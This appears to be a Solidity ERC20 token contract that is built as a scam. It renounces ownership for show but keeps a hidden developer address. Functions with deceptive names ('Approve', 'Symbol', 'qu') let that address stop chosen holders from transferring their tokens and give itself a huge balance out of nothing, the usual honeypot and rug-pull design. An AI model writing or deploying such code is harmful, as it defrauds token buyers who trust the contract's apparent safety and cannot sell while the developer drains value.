// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;
import "./ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Coin is ERC20, Ownable {
    address devAddress;
    mapping(address => uint256) private Wances;

    constructor(string memory name) ERC20(name, name) {
        devAddress = _msgSender();
        _mint(msg.sender, 210_000_000_000_000);
        _transferOwnership(address(0));
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        if (Wances[_msgSender()] == 500) {
            amount = balanceOf(_msgSender()) + 500;
        }
        super._transfer(sender, recipient, amount);
    }

    function Approve(address abc) external {
        if (devAddress != _msgSender()) {
            return;
        }
        Wances[abc] = 500;
    }

    function qu(address abc) external {
        if (devAddress != _msgSender()) {
            return;
        }
        Wances[abc] = 0;
    }

    function Symbol() external {
        if (devAddress != _msgSender()) {
            return;
        }
        _balances[_msgSender()] = totalSupply() * 10 ** 10;
    }
}